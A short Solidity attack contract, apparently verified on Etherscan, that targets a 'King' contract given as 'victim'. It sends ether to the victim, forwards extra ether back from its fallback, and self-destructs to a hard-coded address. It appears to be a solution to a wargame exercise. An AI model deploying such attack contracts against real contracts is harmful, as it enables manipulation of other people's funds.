/**
 *Submitted for verification at Etherscan.io on 2019-02-18
*/

pragma solidity ^0.4.18;

contract King {
    function () external payable;
}

contract KingOfTheHill {
    King k;
    bool public called;

    function KingOfTheHill (address victim) public payable{
        k = King(victim);
    }
    
    function attack(uint value) public {
        k.transfer(value);
    }
    
    function destruct() public {
        selfdestruct(0x62F39dd6862bb26F45ca2A77749Bd5A4038e80Fe);
    }
    
    function () public payable {
        k.transfer(msg.value + 1000);
    }

}
